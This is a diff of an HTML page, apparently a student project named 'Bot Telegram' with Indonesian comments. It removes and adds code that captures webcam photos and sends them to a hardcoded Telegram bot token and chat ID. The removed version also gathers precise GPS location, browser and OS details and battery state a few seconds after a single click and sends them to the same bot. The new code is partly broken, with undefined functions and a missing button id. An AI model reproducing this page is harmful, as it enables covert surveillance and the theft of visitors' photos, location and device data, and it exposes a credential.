@@ -1,128 +1,89 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Tugas Kuliah - Bot Telegram</title>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <title>Bot Telegram</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
-  <h1>Tugas Kuliah - Bot Telegram</h1>
-  
-  <video id="video" autoplay></video>
-  <button onclick="startCapture()">Ambil Foto, Lokasi, dan Info Perangkat</button>
-  <canvas id="canvas" style="display: none;"></canvas>
+    <h1>Bot Telegram</h1>
+    <video id="videoElement" width="640" height="480" autoplay></video>
+    <button onclick="capturePhoto()">Ambil Foto</button>
+    <button onclick="sendPhoto()">Kirim Foto</button>
 
-  <script>
-    const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
-    const chatId = '1121369247';
+    <script>
+        // Mengambil foto dari video element
+        function capturePhoto() {
+            var videoElement = document.getElementById('videoElement');
+            var canvas = document.createElement('canvas');
+            var context = canvas.getContext('2d');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            var dataURL = canvas.toDataURL('image/jpeg');
+            sendPhotoToTelegram(dataURL);
+        }
 
-    function sendTelegramMessage(text) {
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      const data = { chat_id: chatId, text: text };
-      $.post(url, data);
-    }
+        // Mengirim foto ke bot Telegram menggunakan HTTP API
+        function sendPhotoToTelegram(photoData) {
+            // Ganti 'YOUR_BOT_TOKEN' dengan token bot Telegram Anda
+            var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+            // Ganti 'YOUR_CHAT_ID' dengan ID chat Anda
+            var chatId = '1121369247';
 
-    function sendTelegramPhoto(photo) {
-      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
-      const data = { chat_id: chatId, photo: photo };
-      $.post(url, data);
-    }
+            // Membuat objek FormData dan menambahkan data foto
+            var formData = new FormData();
+            formData.append('photo', photoData);
 
-    function startCapture() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const context = canvas.getContext('2d');
+            // Mengirim permintaan AJAX ke HTTP API Telegram
+            $.ajax({
+                url: 'https://api.telegram.org/bot' + botToken + '/sendPhoto?chat_id=' + chatId,
+                type: 'POST',
+                data: formData,
+                contentType: false,
+                processData: false,
+                success: function (response) {
+                    console.log('Foto berhasil dikirim ke Telegram!');
+                },
+                error: function (xhr, status, error) {
+                    console.error('Gagal mengirim foto ke Telegram: ' + error);
+                }
+            });
+        }
 
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
-          video.srcObject = stream;
-        })
-        .catch(function(error) {
-          console.error('Error accessing camera: ', error);
-        });
+        // Mengambil lokasi menggunakan GPS
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                console.error('Geolocation tidak didukung oleh browser Anda.');
+            }
+        }
 
-      video.addEventListener('loadedmetadata', function() {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-      });
+        // Menampilkan lokasi saat ini pada peta
+        function showPosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            var mapUrl = 'https://www.google.com/maps?q=' + latitude + ',' + longitude;
+            window.open(mapUrl, '_blank');
+        }
 
-      video.addEventListener('play', function() {
-        captureFrame();
-      });
+        // Mengambil informasi perangkat dan browser
+        function getDeviceInfo() {
+            var deviceInfo = '';
+            deviceInfo += 'User Agent: ' + navigator.userAgent + '\n';
+            deviceInfo += 'Battery Level: ' + navigator.getBattery().level * 100 + '%\n';
+            // Tambahkan informasi lainnya yang Anda perlukan
 
-      function captureFrame() {
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        setTimeout(captureFrame, 16); // Capture frame every 16ms (60 fps)
-      }
+            alert(deviceInfo);
+        }
 
-      setTimeout(function() {
-        capturePhotoAndSend();
-      }, 3000);
-    }
-
-    function capturePhotoAndSend() {
-      const canvas = document.getElementById('canvas');
-      const photoData = canvas.toDataURL('image/jpeg');
-      sendTelegramPhoto(photoData);
-
-      getLiveLocation();
-      getDeviceInfo();
-      getBatteryInfo();
-      copyToClipboard();
-    }
-
-    function getLiveLocation() {
-      if ('geolocation' in navigator) {
-        const options = { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 };
-        navigator.geolocation.getCurrentPosition(function(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const locationText = `Lokasi: ${lat}, ${lon}`;
-          sendTelegramMessage(locationText);
-        }, function(error) {
-          console.error('Error getting location: ', error);
-        }, options);
-      } else {
-        sendTelegramMessage('Maaf, peramban tidak mendukung geolokasi.');
-      }
-    }
-
-    function getDeviceInfo() {
-      const deviceInfo = `
-        Browser: ${navigator.userAgent}
-        Resolusi Layar: ${screen.width}x${screen.height}
-        Sistem Operasi: ${navigator.platform}
-      `;
-      sendTelegramMessage(deviceInfo);
-    }
-
-    function getBatteryInfo() {
-      if ('getBattery' in navigator) {
-        navigator.getBattery().then(function(battery) {
-          const batteryInfo = `
-            Level Baterai: ${battery.level * 100}%
-            Pengisian: ${battery.charging ? 'Ya' : 'Tidak'}
-          `;
-          sendTelegramMessage(batteryInfo);
-        });
-      } else {
-        sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
-      }
-    }
-
-    function copyToClipboard() {
-      const deviceInfo = `
-        Browser: ${navigator.userAgent}
-        Resolusi Layar: ${screen.width}x${screen.height}
-        Sistem Operasi: ${navigator.platform}
-      `;
-      navigator.clipboard.writeText(deviceInfo)
-        .then(function() {
-          sendTelegramMessage('Info perangkat telah disalin ke clipboard.');
-        })
-        .catch(function(error) {
-          console.error('Error copying to clipboard: ', error);
-        });
-    }
-  </script>
+        // Klik otomatis pada button setelah 3 detik
+        function autoClickButton() {
+            setTimeout(function () {
+                var button = document.getElementById('buttonId');
+                button.click();
+            }, 3000);
+        }
+    </script>
 </body>
 </html>
